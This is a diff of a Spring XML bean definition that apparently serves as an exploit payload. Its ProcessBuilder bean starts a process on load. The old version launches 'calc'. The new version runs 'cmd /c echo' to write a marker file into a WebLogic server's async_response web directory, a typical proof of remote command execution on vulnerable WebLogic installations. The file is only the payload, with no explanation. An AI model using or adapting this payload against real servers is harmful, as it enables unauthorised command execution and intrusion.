@@ -1,14 +1,16 @@
-<beans xmls="http://www.springframework.org/schema/beans"
+<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
-	http://www.springframework.org/schema/beans
-	http://www.springframework.org/schema/beans/spring-beans.xsd
+     http://www.springframework.org/schema/beans
+     http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
-	<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
-		<constructor-arg>
-			<list value-type="java.lang.String">
-				<value>calc</value>
-			</list>
-		</constructor-arg>
-	</bean>
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+     <constructor-arg>
+        <list value-type="java.lang.String">
+	    <value>cmd</value>
+	    <value>/c</value>
+	    <value>echo RcoIl >servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/weblogic.txt</value>
+        </list>
+     </constructor-arg>
+  </bean>
 </beans>
